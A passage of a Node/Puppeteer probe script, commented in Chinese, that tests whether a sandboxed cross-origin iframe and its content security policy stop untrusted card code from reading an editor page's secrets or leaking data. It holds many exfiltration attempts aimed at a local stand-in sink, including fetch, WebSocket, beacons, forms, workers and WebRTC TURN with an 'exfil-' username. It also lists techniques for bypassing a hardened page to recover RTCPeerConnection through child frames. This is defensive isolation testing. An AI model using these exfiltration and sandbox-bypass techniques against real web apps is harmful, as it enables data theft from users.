/**
 * 可行性探针:在线页面里把用户卡 / 图卡的代码放进跨源舞台执行时,隔离与内容安全策略挡不挡得住
 * (契约 `docs/plan/online-card-exec-contract.md` 第 3、4 节;任务书 `docs/plan/sound-online-render-task.md` 第 12、14 条)。
 * 不依赖在线构建,也不依赖任何新包:页面、舞台、「素材服务」、「外部收集站」都是本文件起的最小 HTTP 服务。
 *
 *   node scripts/probes/online-card-isolation-feasibility-probe.mjs [--base-port 5720] [--headful]
 *
 * 端口(都只绑 127.0.0.1):+0 编辑器页 `http://pc.localhost:<+0>`,+1 舞台 `http://s1.pc.localhost:<+1>`(与编辑器页同站跨源),
 * +7 外部收集站 `http://127.0.0.1:<+7>`(与前两者不同站;记下每条 TCP 连接与每个 HTTP 请求)。
 *
 * 摆法:
 *   - 编辑器页手里有「秘密」:localStorage、IndexedDB、可读 cookie、页面变量里的素材票据。
 *   - 编辑器页把票据经带凭据的跨源请求交给舞台源的 `/media-s/<sid>/_grant`,由它回成 HttpOnly cookie(`Path=/media-s/<sid>/`);
 *     舞台用相对地址 `/media-s/<sid>/media/<名>` 取素材,服务端按 cookie 核票据。票据不经舞台的脚本。
 *   - 舞台 iframe 带 `sandbox="allow-scripts allow-same-origin"`;舞台文档与它的脚本带内容安全策略(见 STAGE_CSP)。
 *   - 「卡片代码」是一段 CommonJS 文本,由编辑器页经 postMessage 发给舞台,舞台用 `new Function` 执行;声音那一半在舞台起的
 *     blob Worker 里执行。
 *
 * 断言(每条一行,最后一行是 JSON `{ ok, fails, ... }`):
 *   A 读不到:父页对象、编辑器页的 localStorage / IndexedDB / cookie / OPFS、票据(cookie 是 HttpOnly)。
 *   B 带不走:fetch / XHR / WebSocket / sendBeacon / EventSource / img / CSS / 字体 / script / iframe / 表单 / 预取 / 预连接 /
 *     Worker / importScripts / WebRTC,收集站一个请求都没收到;导航类(自己跳走、顶层跳走、开新窗口、meta 刷新)同样收不到。
 *   C 对照组:去掉策略与 sandbox 再跑同一段代码,收集站收得到 —— 证明 B 的「收不到」不是探针瞎了。
 *   D 能干活:凭 cookie 取到的图片、视频帧画进 2D 画布与 WebGL2 纹理后读得回像素(不污染);Worker 里拿得到 OffscreenCanvas 的 webgl2。
 *   F 已知缺口(记「缺口」,不算探针失败):WebRTC 不受策略管(`webrtc 'block'` 在 Chrome 152 / 154 不生效),STUN / TURN 的包到得了收集站;
 *     用脚本加固(去掉构造器、Trusted Types 拒掉带子框架的 HTML、不给造子框架元素)之后还剩哪几条路能拿回构造器,逐条列出。
 *   E 另一条路(对比用):编辑器页取字节成 Blob 再 postMessage 给舞台,舞台 createObjectURL 后同样读得回像素;记 64 MB Blob 的传递耗时。
 */
import puppeteer from 'puppeteer';
import http from 'node:http';
import dgram from 'node:dgram';
import { PNG } from 'pngjs';
import { PROBE_CHROME_ARGS } from './probe-chrome.mjs';

const argv = process.argv.slice(2);
const arg = (name, dflt) => { const i = argv.indexOf(name); return i >= 0 ? argv[i + 1] : dflt; };
const BASE = Number(arg('--base-port', 5720));
const HEADFUL = argv.includes('--headful');
const EDITOR = `http://pc.localhost:${BASE}`;
const STAGE = `http://s1.pc.localhost:${BASE + 1}`;
const SINK_ORIGIN = `http://127.0.0.1:${BASE + 7}`;
const TICKET = 'v1.PROBE-TICKET-DO-NOT-LEAK.sig';
const SECRET = 'PROBE-CREDENTIAL-DO-NOT-LEAK';

/** 舞台文档、舞台源上一切脚本响应都带的策略(nginx 在 s1 / s2 的 server 块里加;页面里另有同文的 meta 兜底) */
const STAGE_CSP = [
  "default-src 'none'",
  "script-src 'self' 'unsafe-eval'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "media-src 'self' blob:",
  "font-src 'self' data:",
  "connect-src 'self'",
  "worker-src blob:",
  "frame-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'",
  `frame-ancestors ${EDITOR}`,
  "webrtc 'block'",
].join('; ');
/** 编辑器页的策略里与舞台有关的只有这一条:舞台 iframe 只能载入舞台源(它自己跳走也受这条管) */
const EDITOR_CSP = `frame-src ${STAGE}`;

const png = (() => { const p = new PNG({ width: 4, height: 4 }); for (let i = 0; i < 16; i++) p.data.set([10, 200, 30, 255], i * 4); return PNG.sync.write(p); })();
const uploads = new Map(); // 名 → Buffer(编辑器页录的一小段 webm)
const sink = { connections: 0, requests: [], udp: 0 };

/* ------------------------------------------------------------------ 卡片代码(CommonJS 文本) */
const CARD = String.raw`
exports.probeAll = async function (ctx) {
  const out = {};
  const t = async (name, fn) => { if (ctx.only && name !== ctx.only) return; try { out[name] = await Promise.race([fn(), new Promise((r) => setTimeout(() => r("超时(8 秒没结果)"), 8000))]); } catch (e) { out[name] = "抛错:" + (e && e.name) + ":" + String(e && e.message).slice(0, 80); } };
  const E = ctx.sink, tag = ctx.tag;
  // A 读
  await t("parent.document", () => String(parent.document.title));
  await t("parent.localStorage", () => parent.localStorage.getItem("pc.credential"));
  await t("parent.__ticket", () => String(parent.__ticket));
  await t("top.location.href", () => String(top.location.href));
  await t("opener", () => String(window.opener));
  await t("frameElement", () => String(window.frameElement));
  await t("localStorage", () => JSON.stringify(Object.keys(localStorage).map((k) => [k, localStorage.getItem(k)])));
  await t("indexedDB", async () => JSON.stringify((await indexedDB.databases()).map((d) => d.name)));
  await t("document.cookie", () => document.cookie);
  await t("cookieStore", async () => JSON.stringify((await cookieStore.getAll()).map((c) => c.name + "=" + c.value)));
  await t("opfs", async () => { const d = await navigator.storage.getDirectory(); const n = []; for await (const k of d.keys()) n.push(k); return JSON.stringify(n); });
  await t("caches", async () => JSON.stringify(await caches.keys()));
  await t("realm-scan", () => { const hit = []; for (const k of Object.getOwnPropertyNames(window)) { let v; try { v = window[k]; } catch { continue; } if (typeof v === "string" && /PROBE-/.test(v)) hit.push(k); } return JSON.stringify(hit); });
  await t("perf-entries", () => JSON.stringify(performance.getEntries().map((e) => e.name).filter((n) => /PROBE-|[?&]t=/.test(n))));
  // B 带走(非导航)
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  await t("fetch", () => fetch(E + "/x?fetch=" + tag).then((r) => "到达:" + r.status));
  await t("fetch-no-cors", () => fetch(E + "/x?nocors=" + tag, { mode: "no-cors" }).then(() => "到达"));
  await t("xhr", () => new Promise((res) => { const x = new XMLHttpRequest(); x.onload = () => res("到达"); x.onerror = () => res("拦下"); x.open("GET", E + "/x?xhr=" + tag); x.send(); }));
  await t("websocket", () => new Promise((res) => { const w = new WebSocket(E.replace("http", "ws") + "/ws?" + tag); w.onopen = () => res("到达"); w.onerror = () => res("拦下"); setTimeout(() => res("超时"), 1500); }));
  await t("beacon", () => String(navigator.sendBeacon(E + "/x?beacon=" + tag, "d")));
  await t("eventsource", () => new Promise((res) => { const s = new EventSource(E + "/x?es=" + tag); s.onopen = () => res("到达"); s.onerror = () => { s.close(); res("拦下"); }; }));
  await t("img", () => new Promise((res) => { const i = new Image(); i.onload = () => res("到达"); i.onerror = () => res("拦下"); i.src = E + "/x.png?img=" + tag; }));
  await t("css-bg", async () => { const d = document.createElement("div"); d.style.backgroundImage = "url(" + E + "/x.png?cssbg=" + tag + ")"; d.style.width = "10px"; d.style.height = "10px"; document.body.appendChild(d); await wait(300); return "已插入"; });
  await t("css-import", async () => { const s = document.createElement("style"); s.textContent = "@import url(" + E + "/x.css?cssimport=" + tag + "); @font-face{font-family:pf;src:url(" + E + "/x.woff2?font=" + tag + ")} .pf{font-family:pf}"; document.head.appendChild(s); const d = document.createElement("div"); d.className = "pf"; d.textContent = "x"; document.body.appendChild(d); await wait(300); return "已插入"; });
  await t("link-css", async () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = E + "/x.css?link=" + tag; document.head.appendChild(l); await wait(300); return "已插入"; });
  await t("script-src", () => new Promise((res) => { const s = document.createElement("script"); s.onload = () => res("到达"); s.onerror = () => res("拦下"); s.src = E + "/x.js?script=" + tag; document.head.appendChild(s); }));
  await t("dynamic-import", () => import(E + "/x.js?dynimport=" + tag).then(() => "到达"));
  await t("iframe", async () => { const f = document.createElement("iframe"); f.src = E + "/x?iframe=" + tag; document.body.appendChild(f); await wait(500); return "已插入"; });
  await t("object", async () => { const o = document.createElement("object"); o.data = E + "/x?object=" + tag; document.body.appendChild(o); await wait(300); return "已插入"; });
  await t("video", () => new Promise((res) => { const v = document.createElement("video"); v.onerror = () => res("拦下"); v.onloadeddata = () => res("到达"); v.src = E + "/x.webm?video=" + tag; setTimeout(() => res("超时"), 1000); }));
  await t("form", async () => { const f = document.createElement("form"); f.action = E + "/x?form=" + tag; f.method = "POST"; f.target = "_self"; document.body.appendChild(f); f.submit(); await wait(500); return "已提交"; });
  await t("a-ping", async () => { const a = document.createElement("a"); a.href = "#"; a.ping = E + "/x?ping=" + tag; document.body.appendChild(a); a.click(); await wait(300); return "已点"; });
  for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload"]) await t("hint-" + rel, async () => { const l = document.createElement("link"); l.rel = rel; l.href = E + "/x.js?" + rel + "=" + tag; if (rel === "preload") l.as = "script"; document.head.appendChild(l); await wait(600); return "已插入"; });
  await t("blank-iframe-realm", async () => { const f = document.createElement("iframe"); document.body.appendChild(f); const W = f.contentWindow; let r = "子框架里 RTCPeerConnection:" + typeof W.RTCPeerConnection; try { const x = await W.fetch(E + "/x?blankfetch=" + tag); r += ";fetch 到达:" + x.status; } catch (e) { r += ";fetch 拦下"; } return r; });
  await t("srcdoc-iframe", async () => { const f = document.createElement("iframe"); f.srcdoc = "<scr" + "ipt>fetch('" + E + "/x?srcdocfetch=" + tag + "').catch(()=>{});new Image().src='" + E + "/x.png?srcdocimg=" + tag + "'<" + "/scr" + "ipt>"; document.body.appendChild(f); await wait(500); return "已插入"; });
  await t("worker-url", () => new Promise((res) => { try { const w = new Worker(E + "/x.js?worker=" + tag); w.onerror = () => res("拦下"); setTimeout(() => res("已建"), 500); } catch (e) { res("抛错:" + e.name); } }));
  await t("worker-same-origin-url", () => new Promise((res) => { try { const w = new Worker("/plain-worker.js"); w.onmessage = (e) => res("跑起来了:" + e.data); w.onerror = () => res("拦下"); setTimeout(() => res("超时"), 800); } catch (e) { res("抛错:" + e.name); } }));
  await t("service-worker", () => navigator.serviceWorker.register("/plain-worker.js").then(() => "注册成功"));
  await t("webrtc", () => new Promise((res) => { let pc; try { pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:" + ctx.sinkPort }, { urls: "turn:127.0.0.1:" + ctx.sinkPort + "?transport=tcp", username: "exfil-" + tag, credential: "x" }] }); } catch (e) { return res("抛错:" + e.name); } const got = []; pc.onicecandidate = (e) => { if (e.candidate) got.push(e.candidate.type); else res("候选:" + JSON.stringify(got)); }; pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)).catch((e) => res("抛错:" + e.name)); setTimeout(() => res("候选(超时):" + JSON.stringify(got)), 2500); }));
  await t("webtransport", () => { if (typeof WebTransport !== "function") return "没有这个接口"; const w = new WebTransport("https://127.0.0.1:" + ctx.sinkPort + "/wt"); return w.ready.then(() => "到达", () => "拦下"); });
  // D 能干活
  await t("img-canvas-2d", () => new Promise((res, rej) => { const i = new Image(); i.onload = () => { const c = document.createElement("canvas"); c.width = c.height = 4; const g = c.getContext("2d"); g.drawImage(i, 0, 0); res(Array.from(g.getImageData(0, 0, 1, 1).data).join(",")); }; i.onerror = () => rej(new Error("图片取不到")); i.src = ctx.mediaBase + "/media/img.png"; }));
  await t("img-webgl2", async () => { const r = await fetch(ctx.mediaBase + "/media/img.png"); const bmp = await createImageBitmap(await r.blob(), { premultiplyAlpha: "none" }); return glRead(document.createElement("canvas"), bmp); });
  await t("video-webgl2", () => new Promise((res, rej) => { const v = document.createElement("video"); v.muted = true; v.preload = "auto"; v.playsInline = true; v.onerror = () => rej(new Error("视频取不到:" + (v.error && v.error.message))); v.onloadeddata = () => { v.onseeked = async () => { try { const bmp = await createImageBitmap(v, { premultiplyAlpha: "none" }); res(glRead(document.createElement("canvas"), bmp)); } catch (e) { rej(e); } }; v.currentTime = 0.1; }; v.src = ctx.mediaBase + "/media/clip.webm"; setTimeout(() => rej(new Error("超时")), 5000); }));
  await t("media-without-cookie-path", () => fetch("/media-s/other/media/img.png").then((r) => "状态:" + r.status));
  function glRead(c, bmp) { c.width = c.height = 4; const gl = c.getContext("webgl2", { preserveDrawingBuffer: true }); if (!gl) throw new Error("没有 webgl2"); const tex = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, tex); gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, bmp); const fb = gl.createFramebuffer(); gl.bindFramebuffer(gl.FRAMEBUFFER, fb); gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0); const px = new Uint8Array(4); gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, px); return Array.from(px).join(",") + " | " + (gl.getExtension("WEBGL_debug_renderer_info") ? gl.getParameter(gl.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL) : "?"); }
  return out;
};
exports.audio = async function (ctx) {
  const out = {};
  const t = async (name, fn) => { try { out[name] = await fn(); } catch (e) { out[name] = "抛错:" + (e && e.name) + ":" + String(e && e.message).slice(0, 80); } };
  const E = ctx.sink, tag = ctx.tag;
  await t("w.parent", () => typeof self.parent + "/" + typeof self.document + "/" + typeof self.localStorage);
  await t("w.indexedDB", async () => JSON.stringify((await indexedDB.databases()).map((d) => d.name)));
  await t("w.cookieStore", async () => typeof cookieStore === "undefined" ? "没有这个接口" : JSON.stringify((await cookieStore.getAll()).map((c) => c.name)));
  await t("w.fetch", () => fetch(E + "/x?wfetch=" + tag).then((r) => "到达:" + r.status));
  await t("w.websocket", () => new Promise((res) => { const w = new WebSocket(E.replace("http", "ws") + "/ws?w" + tag); w.onopen = () => res("到达"); w.onerror = () => res("拦下"); setTimeout(() => res("超时"), 1500); }));
  await t("w.importScripts", () => { importScripts(E + "/x.js?wimport=" + tag); return "到达"; });
  await t("w.nested-worker-url", () => new Promise((res) => { try { const w = new Worker(E + "/x.js?wworker=" + tag); w.onerror = () => res("拦下"); setTimeout(() => res("已建"), 500); } catch (e) { res("抛错:" + e.name); } }));
  await t("w.offscreen-webgl2", () => { const c = new OffscreenCanvas(4, 4); return c.getContext("webgl2") ? "有" : "没有"; });
  await t("w.media-fetch", () => fetch(self.location.origin + ctx.mediaBase + "/media/img.png").then((r) => "状态:" + r.status));
  await t("w.pcm", () => { const a = new Float32Array(48000); for (let i = 0; i < a.length; i++) a[i] = Math.sin(i / 20); return "采样:" + a.length; });
  return out;
};
`;

/* ------------------------------------------------------------------ 页面 */
const editorHtml = (mode) => `<!doctype html><meta charset=utf-8><title>EDITOR-SECRET-TITLE</title><body><script type=module>
const P = new URLSearchParams(location.search), mode = ${JSON.stringify(mode)}, nav = P.get("nav"), only = P.get("only");
localStorage.setItem("pc.credential", ${JSON.stringify(SECRET)});
document.cookie = "pc_editor=${SECRET}; Path=/";
await new Promise((res) => { const r = indexedDB.open("pc-editor-db", 1); r.onupgradeneeded = () => r.result.createObjectStore("s"); r.onsuccess = () => { r.result.transaction("s", "readwrite").objectStore("s").put(${JSON.stringify(SECRET)}, "k"); res(); }; });
window.__ticket = ${JSON.stringify(TICKET)};
const sid = "sid" + Math.random().toString(36).slice(2, 10);
// 录一小段 webm 当「素材」,传给探针的「素材服务」
const cv = document.createElement("canvas"); cv.width = cv.height = 64; const g = cv.getContext("2d");
const rec = new MediaRecorder(cv.captureStream(30), { mimeType: "video/webm;codecs=vp8" }); const chunks = []; rec.ondataavailable = (e) => chunks.push(e.data);
rec.start(); for (let i = 0; i < 20; i++) { g.fillStyle = "rgb(10,200,30)"; g.fillRect(0, 0, 64, 64); g.fillStyle = "#000"; g.fillRect(i, 60, 2, 2); await new Promise((r) => setTimeout(r, 40)); }
await new Promise((r) => { rec.onstop = r; rec.stop(); });
await fetch("/upload/clip.webm", { method: "POST", body: new Blob(chunks) });
const f = document.createElement("iframe");
if (mode !== "control") f.setAttribute("sandbox", "allow-scripts allow-same-origin");
f.src = ${JSON.stringify(STAGE)} + "/stage.html" + (mode === "control" ? "?nocsp=1" : "");
f.style.cssText = "width:320px;height:180px";
const results = {};
window.addEventListener("message", async (e) => {
  if (e.source !== f.contentWindow || e.origin !== ${JSON.stringify(STAGE)}) { (results.foreign ||= []).push(String(e.origin)); return; }
  const d = e.data;
  if (d.type === "ready") {
    const t0 = performance.now();
    const r = await fetch(${JSON.stringify(STAGE)} + "/media-s/" + sid + "/_grant", { method: "POST", credentials: "include", headers: { Authorization: "Bearer " + window.__ticket } });
    results.grant = { status: r.status, ms: Math.round(performance.now() - t0) };
    // E:字节由宿主取成 Blob 再递给舞台
    const big = new Blob([new Uint8Array(64 * 1024 * 1024)]);
    const img = await (await fetch("/host-img.png")).blob();
    const t1 = performance.now();
    f.contentWindow.postMessage({ type: "run", code: ${JSON.stringify(CARD)}, ctx: { sink: ${JSON.stringify(SINK_ORIGIN)}, sinkPort: ${BASE + 7}, tag: mode, mediaBase: "/media-s/" + sid, nav, only }, blobs: { img, big }, sentAt: performance.timeOrigin + t1 }, ${JSON.stringify(STAGE)});
  }
  if (d.type === "result") { Object.assign(results, d.results); window.__done = results; }
});
document.body.appendChild(f);
window.__alive = () => new Promise((res) => { const ch = new MessageChannel(); ch.port1.onmessage = () => res(true); setTimeout(() => res(false), 800); f.contentWindow.postMessage({ type: "ping" }, "*", [ch.port2]); });
</script>`;

const stageHtml = `<!doctype html><meta charset=utf-8><title>stage</title><body><script src="/stage.js"></script>`;
/**
 * F 加固试验(WebRTC 不归内容安全策略管,Chrome 152 / 154 实测 `webrtc 'block'` 不生效):舞台在卡片代码之前
 *   1. 把本文档的 RTCPeerConnection 换成不可改的 undefined;
 *   2. 用 Trusted Types 的缺省策略拒掉一切带 iframe / frame / object / embed 的 HTML 串;
 *   3. createElement / createElementNS / customElements.define 不给造这几种元素;
 *   4. MutationObserver 兜底:真出现了就当场摘掉。
 * 然后逐条试「从子框架拿回 RTCPeerConnection」的路,回报哪些拿到了。
 */
const HARDEN_CSP = STAGE_CSP + "; require-trusted-types-for 'script'; trusted-types default";
const hardenHtml = `<!doctype html><meta charset=utf-8><body><div id=host></div><script src="/harden.js"></script>`;
const hardenJs = String.raw`
const FRAME = /<\s*(iframe|frame|frameset|object|embed|portal|fencedframe)\b/i, NAMES = new Set(["iframe", "frame", "frameset", "object", "embed", "portal", "fencedframe"]);
trustedTypes.createPolicy("default", { createHTML: (h) => { if (FRAME.test(h)) throw new TypeError("blocked frame html"); return h; }, createScript: (x) => x, createScriptURL: (x) => x });
for (const k of ["RTCPeerConnection", "webkitRTCPeerConnection"]) Object.defineProperty(window, k, { value: undefined, configurable: false, writable: false });
for (const m of ["createElement", "createElementNS"]) { const orig = Document.prototype[m]; Object.defineProperty(Document.prototype, m, { configurable: false, writable: false, value: function (...a) { const name = String(m === "createElement" ? a[0] : a[1]).toLowerCase().split(":").pop(); if (NAMES.has(name)) throw new TypeError("blocked element"); return orig.apply(this, a); } }); }
{ const orig = CustomElementRegistry.prototype.define; Object.defineProperty(CustomElementRegistry.prototype, "define", { configurable: false, writable: false, value: function (n, c, o) { if (o && o.extends && NAMES.has(String(o.extends).toLowerCase())) throw new TypeError("blocked extends"); return orig.call(this, n, c, o); } }); }
let tripped = 0;
new MutationObserver((list) => { for (const r of list) for (const node of r.addedNodes) { if (node.nodeType !== 1) continue; const hits = NAMES.has(node.localName) ? [node] : [...node.querySelectorAll([...NAMES].join(","))]; for (const h of hits) { tripped++; h.remove(); } } }).observe(document, { childList: true, subtree: true });
// ---- 以下是「卡片代码」
const host = document.getElementById("host"), out = {};
const grab = () => { for (let i = 0; i < window.length; i++) { try { if (typeof window[i].RTCPeerConnection === "function") return "拿到了"; } catch (e) {} } return "没拿到(子框架 " + window.length + " 个)"; };
const t = (name, fn) => { try { fn(); out[name] = grab(); } catch (e) { out[name] = "抛错:" + e.name + ";" + grab(); } for (const f of [...document.querySelectorAll("iframe,object,embed,frame")]) f.remove(); };
out["own"] = typeof window.RTCPeerConnection;
t("createElement", () => host.appendChild(document.createElement("iframe")));
t("createElement-大写", () => host.appendChild(document.createElement("IFRAME")));
t("createElementNS", () => host.appendChild(document.createElementNS("http://www.w3.org/1999/xhtml", "iframe")));
t("innerHTML", () => { host.innerHTML = "<iframe></iframe>"; });
t("insertAdjacentHTML", () => host.insertAdjacentHTML("beforeend", "<iframe></iframe>"));
t("outerHTML", () => { const d = document.createElement("div"); host.appendChild(d); d.outerHTML = "<iframe></iframe>"; });
t("DOMParser+adopt", () => { const d = new DOMParser().parseFromString("<iframe></iframe>", "text/html"); host.appendChild(document.adoptNode(d.querySelector("iframe"))); });
t("createContextualFragment", () => host.appendChild(document.createRange().createContextualFragment("<iframe></iframe>")));
t("template", () => { const tp = document.createElement("template"); tp.innerHTML = "<iframe></iframe>"; host.appendChild(tp.content); });
t("setHTMLUnsafe", () => host.setHTMLUnsafe("<iframe></iframe>"));
t("setHTML(Sanitizer)", () => host.setHTML("<iframe></iframe>"));
t("另一个文档的 createElement", () => { const d = document.implementation.createHTMLDocument(""); host.appendChild(d.createElement("iframe")); });
t("XML 文档的 createElementNS", () => { const d = document.implementation.createDocument("http://www.w3.org/1999/xhtml", "html", null); host.appendChild(d.createElementNS("http://www.w3.org/1999/xhtml", "iframe")); });
t("自定义内建元素", () => { class X extends HTMLIFrameElement {} customElements.define("x-f", X, { extends: "iframe" }); host.appendChild(new X()); });
t("XSLT", () => { const xsl = new DOMParser().parseFromString('<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:element name="{concat(&quot;ifr&quot;,&quot;ame&quot;)}" namespace="http://www.w3.org/1999/xhtml"/></xsl:template></xsl:stylesheet>', "application/xml"); const pr = new XSLTProcessor(); pr.importStylesheet(xsl); host.appendChild(pr.transformToFragment(new DOMParser().parseFromString("<a/>", "application/xml"), document)); });
t("object", () => { const o = document.createElement("object"); o.data = "about:blank"; host.appendChild(o); });
t("svg-foreignObject", () => { host.innerHTML = "<svg><foreignObject><iframe xmlns='http://www.w3.org/1999/xhtml'></iframe></foreignObject></svg>"; });
t("importNode(从取回来的同源文档)", () => { const x = new XMLHttpRequest(); x.open("GET", "/has-iframe.html", false); x.send(); const d = new DOMParser().parseFromString(x.responseText, "text/html"); host.appendChild(document.importNode(d.querySelector("iframe"), true)); });
t("XHR responseType=document", () => new Promise(() => {}));
t("execCommand", () => { host.contentEditable = "true"; host.focus(); document.execCommand("insertHTML", false, "<iframe></iframe>"); });
t("window.open", () => { const w = window.open("about:blank"); if (w && typeof w.RTCPeerConnection === "function") throw new Error("OPENED"); });
(async () => {
  // 异步的 XHR 文档:解析不经 Trusted Types
  out["XHR responseType=document"] = await new Promise((res) => { const x = new XMLHttpRequest(); x.open("GET", "/has-iframe.html"); x.responseType = "document"; x.onload = () => { try { host.appendChild(document.importNode(x.response.querySelector("iframe"), true)); res(grab()); } catch (e) { res("抛错:" + e.name + ";" + grab()); } }; x.onerror = () => res("取不到"); x.send(); });
  // 兜底的时机:同一拍里插入后马上取
  await new Promise((r) => setTimeout(r, 300));
  parent.postMessage({ type: "harden", out, tripped }, "*");
})();
`;

const stageJs = String.raw`
const violations = [];
document.addEventListener("securitypolicyviolation", (e) => violations.push(e.effectiveDirective + " " + String(e.blockedURI).slice(0, 60)));
addEventListener("message", async (e) => {
  if (e.source !== parent) return;
  const d = e.data;
  if (d.type === "ping") { e.ports[0].postMessage("pong"); return; }
  if (d.type !== "run") return;
  const results = {};
  // E:宿主递来的 Blob
  try {
    results.blobTransferMs = Math.round(performance.timeOrigin + performance.now() - d.sentAt);
    results.bigBlobSize = d.blobs.big.size;
    const t0 = performance.now(); const head = new Uint8Array(await d.blobs.big.slice(0, 16).arrayBuffer()); results.bigBlobSliceMs = Math.round(performance.now() - t0) + "ms/" + head.length;
    const url = URL.createObjectURL(d.blobs.img);
    results.blobImgCanvas = await new Promise((res, rej) => { const i = new Image(); i.onload = () => { const c = document.createElement("canvas"); c.width = c.height = 4; const g = c.getContext("2d"); g.drawImage(i, 0, 0); try { res(Array.from(g.getImageData(0, 0, 1, 1).data).join(",")); } catch (err) { rej(err); } }; i.onerror = () => rej(new Error("blob 图片载入失败")); i.src = url; });
  } catch (err) { results.blobPath = "抛错:" + err.message; }
  // 画面那一半:卡片代码在舞台文档里执行
  const mod = { exports: {} };
  try { new Function("require", "module", "exports", d.code)(() => { throw new Error("no modules in probe"); }, mod, mod.exports); results.evalOk = true; } catch (err) { results.evalOk = "抛错:" + err.message; }
  if (results.evalOk === true) results.main = await mod.exports.probeAll(d.ctx);
  // 声音那一半:舞台起 blob Worker(继承舞台文档的策略),卡片代码在里面执行
  try {
    const src = "onmessage=async(e)=>{const m={exports:{}};new Function('require','module','exports',e.data.code)(()=>{throw new Error('no modules')},m,m.exports);postMessage(await m.exports.audio(e.data.ctx));}";
    const w = new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
    results.worker = await new Promise((res) => { w.onmessage = (ev) => res(ev.data); w.onerror = (ev) => res("Worker 出错:" + ev.message); w.postMessage({ code: d.code, ctx: d.ctx }); setTimeout(() => res("超时"), 8000); });
    w.terminate();
  } catch (err) { results.worker = "抛错:" + err.message; }
  results.violations = violations.length;
  results.violationKinds = [...new Set(violations.map((v) => v.split(" ")[0]))];
  parent.postMessage({ type: "result", results }, "*");
  // 导航类放最后:它会把舞台自己带走
  const E = d.ctx.sink, tag = d.ctx.tag, nav = d.ctx.nav;
  await new Promise((r) => setTimeout(r, 200));
  try {
    if (nav === "self") location.href = E + "/x?navself=" + tag;
    if (nav === "top") top.location.href = E + "/x?navtop=" + tag;
    if (nav === "open") window.open(E + "/x?navopen=" + tag);
    if (nav === "meta") { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + E + "/x?navmeta=" + tag; document.head.appendChild(m); }
    if (nav === "anchor") { const a = document.createElement("a"); a.href = E + "/x?navanchor=" + tag; a.target = "_top"; document.body.appendChild(a); a.click(); }
  } catch (err) { /* 抛错也算拦下 */ }
});
parent.postMessage({ type: "ready" }, "*");
`;

/* ------------------------------------------------------------------ 服务 */
const send = (res, status, headers, body) => { res.writeHead(status, headers); res.end(body); };
const cookieOf = (req, name) => (req.headers.cookie || '').split(/;\s*/).map((p) => p.split('=')).find(([k]) => k === name)?.slice(1).join('=');

const editorSrv = http.createServer((req, res) => {
  const u = new URL(req.url, EDITOR);
  if (u.pathname === '/') return send(res, 200, { 'content-type': 'text/html', ...(u.searchParams.get('mode') === 'control' ? {} : { 'content-security-policy': EDITOR_CSP }), 'origin-agent-cluster': '?1' }, editorHtml(u.searchParams.get('mode') || 'guarded'));
  if (u.pathname === '/harden-host') return send(res, 200, { 'content-type': 'text/html' }, `<!doctype html><body><script>addEventListener("message", (e) => { if (e.data && e.data.type === "harden") window.__h = e.data; })</script><iframe sandbox="allow-scripts allow-same-origin" src="${STAGE}/harden.html"></iframe>`);
  if (u.pathname === '/host-img.png') return send(res, 200, { 'content-type': 'image/png' }, png);
  if (u.pathname.startsWith('/upload/') && req.method === 'POST') { const parts = []; req.on('data', (c) => parts.push(c)); req.on('end', () => { uploads.set(u.pathname.slice(8), Buffer.concat(parts)); send(res, 204, {}); }); return; }
  send(res, 404, {}, '');
});

const stageSrv = http.createServer((req, res) => {
  const u = new URL(req.url, STAGE);
  const guarded = !/nocsp=1/.test(req.headers.referer || '') && !u.searchParams.has('nocsp');
  const sec = guarded ? { 'content-security-policy': STAGE_CSP } : {};
  const base = { ...sec, 'origin-agent-cluster': '?1', 'x-content-type-options': 'nosniff' };
  if (u.pathname === '/stage.html') return send(res, 200, { ...base, 'content-type': 'text/html' }, stageHtml);
  if (u.pathname === '/stage.js') return send(res, 200, { ...base, 'content-type': 'text/javascript' }, stageJs);
  if (u.pathname === '/harden.html') return send(res, 200, { 'content-security-policy': HARDEN_CSP, 'content-type': 'text/html' }, hardenHtml);
  if (u.pathname === '/harden.js') return send(res, 200, { 'content-security-policy': HARDEN_CSP, 'content-type': 'text/javascript' }, hardenJs);
  if (u.pathname === '/has-iframe.html') return send(res, 200, { 'content-type': 'text/html' }, '<!doctype html><body><iframe></iframe>');
  if (u.pathname === '/plain-worker.js') return send(res, 200, { 'content-type': 'text/javascript' }, 'postMessage("no-csp-worker")'); // 故意不带策略:同源脚本地址起的 Worker 不继承文档的策略
  const m = /^\/media-s\/([A-Za-z0-9]+)\/(.*)$/.exec(u.pathname);
  if (m) {
    const cors = { 'access-control-allow-origin': EDITOR, 'access-control-allow-credentials': 'true', 'access-control-allow-headers': 'authorization', 'access-control-allow-methods': 'POST', vary: 'origin' };
    if (m[2] === '_grant') {
      if (req.method === 'OPTIONS') return send(res, 204, cors);
      if (req.headers.origin !== EDITOR) return send(res, 403, {}, '');
      const tk = /^Bearer (.+)$/.exec(req.headers.authorization || '')?.[1];
      return send(res, 204, { ...cors, 'set-cookie': `pc_rt=${tk}; Path=/media-s/${m[1]}/; HttpOnly; SameSite=Strict; Max-Age=900`, 'cache-control': 'no-store' });
    }
    // 「素材服务」:按 cookie 核票据(nginx 把 cookie 换成 Authorization 头再转给素材服务)
    if (cookieOf(req, 'pc_rt') !== TICKET) return send(res, 401, base, 'unauthorized');
    const name = m[2].replace(/^media\//, '');
    const body = name === 'img.png' ? png : uploads.get(name);
    if (!body) return send(res, 404, base, '');
    const type = name.endsWith('.png') ? 'image/png' : 'video/webm';
